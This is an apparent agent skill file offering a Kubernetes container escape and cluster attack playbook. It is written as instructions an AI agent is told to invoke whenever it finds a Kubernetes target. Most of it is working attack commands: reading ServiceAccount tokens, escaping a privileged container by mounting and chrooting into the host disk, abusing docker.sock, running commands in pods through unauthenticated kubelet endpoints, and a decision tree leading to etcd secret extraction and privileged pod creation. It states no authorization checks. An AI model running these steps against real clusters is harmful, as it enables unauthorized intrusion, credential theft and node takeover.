---
name: k8s-container-escape
description: "Kubernetes container escape and cluster attacks. Use when the target runs in a K8s environment, when ports 6443/10250/2379 are discovered, when a ServiceAccount token is obtained, or when already inside a container. Covers container escape, pod privilege escalation, API server unauthorized access, etcd leakage, RBAC abuse, and node takeover. Should be used for any scenario involving Kubernetes, container orchestration, or cloud-native security"
zh-signals: "Kubernetes 容器逃逸与集群攻击，覆盖 Pod 提权、API Server 与 RBAC 滥用。信号:Kubernetes,容器逃逸,RBAC,API Server,etcd"
when-to-use: >-
  Use when a target runs in Kubernetes, you have a foothold in a container or ServiceAccount
  token, or you discover exposed 6443/10250/2379 ports requiring cluster-level attack testing.
metadata:
  tags: "k8s,kubernetes,container,escape,pod,rbac,etcd,apiserver,serviceaccount,container-escape,cloud-native,cluster-attack"
  category: "cloud"
---

# Kubernetes Container Escape and Cluster Attacks

Once a K8s cluster is breached, the attack surface is enormous — from a single Pod you can spread laterally to every node and service in the cluster.

## ⛔ Further Reading (Must Read)

- Detailed container escape techniques (mount escape/kernel vulnerability/privileged container/cgroup) → read [references/escape-techniques.md](references/escape-techniques.md)
- Cluster-level attacks (API Server/etcd/RBAC/lateral movement) → read [references/cluster-attacks.md](references/cluster-attacks.md)
- RBAC permission self-check, in-pod API requests, badPods/KubeHound/gitRepo volume → read [references/rbac-and-api-abuse.md](references/rbac-and-api-abuse.md)

---

## Phase 1: Environment Identification

### 1.1 Confirm you are inside a container
```bash
cat /proc/1/cgroup 2>/dev/null | grep -qi 'docker\|kubepods\|containerd'
ls /.dockerenv 2>/dev/null || ls /run/secrets/kubernetes.io 2>/dev/null
hostname    # K8s Pod names usually contain the deployment name
env | grep -i kube
```

### 1.2 K8s environment information gathering
```bash
# ServiceAccount token (almost every Pod has one)
SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)

# API Server address
echo $KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT

# Test API permissions
curl -sk -H "Authorization: Bearer $SA_TOKEN" \
  https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/$NAMESPACE/pods
```

### 1.3 External port probing
| Port | Service | Attack surface |
|------|------|--------|
| 6443 | API Server | Unauthorized access/token exploitation |
| 10250 | Kubelet | Command execution |
| 10255 | Kubelet (read-only) | Information leakage |
| 2379 | etcd | Full data dump (including Secrets) |
| 8080 | API Server (insecure) | Full control |

## Phase 2: Attack Decision Tree

```
Current location?
├─ Inside a container
│   ├─ Privileged container (privileged=true) → mount the host → escape
│   ├─ hostPath/docker.sock mounted → escape
│   ├─ SA token available → SelfSubjectRulesReview / can-i → RBAC-permission-driven attacks
│   ├─ Can create pods / pods/exec / impersonate → pod creation, entering a high-privilege pod, or impersonating a high-privilege account
│   └─ Ordinary container → kernel vulnerability/cgroup escape
├─ Can reach Kubelet (10250)
│   └─ Unauthorized → arbitrary pod command execution
├─ Can reach API Server (6443/8080)
│   ├─ Anonymous access → create a privileged pod
│   └─ Token → RBAC permission enumeration
└─ Can reach etcd (2379)
    └─ Extract all Secrets
Detailed commands → refer to the references
```

## Phase 3: Container Escape Quick Reference

### Privileged container escape (most common)
```bash
# Check whether this is a privileged container
cat /proc/1/status | grep -i cap
# CapEff: 0000003fffffffff means full capabilities = privileged container

# Method 1: mount the host filesystem
mkdir -p /tmp/hostroot
mount /dev/sda1 /tmp/hostroot
chroot /tmp/hostroot bash
```

### Docker socket escape
```bash
ls -la /var/run/docker.sock
# If it exists, a privileged container can be created to mount the host
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
```

→ Full escape techniques → [references/escape-techniques.md](references/escape-techniques.md)

## Phase 4: Kubelet Unauthorized Access

```bash
# List all pods
curl -sk https://NODE_IP:10250/pods

# Execute a command in any pod
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER \
  -d "cmd=id"
```

## Phase 5: Cluster Takeover

```bash
# Check permissions with the SA token
curl -sk -H "Authorization: Bearer $SA_TOKEN" \
  https://API_SERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"create","resource":"pods"}}}'

# If pods can be created → create a privileged pod that mounts the node
```

→ Detailed cluster attacks → [references/cluster-attacks.md](references/cluster-attacks.md)

## Tool Quick Reference
| Tool | Purpose |
|------|------|
| kubectl | K8s cluster administration |
| kubeletctl | Kubelet exploitation |
| CDK | Container escape automation |
| PEIRATES | K8s penetration testing framework |
| etcdctl | etcd data extraction |
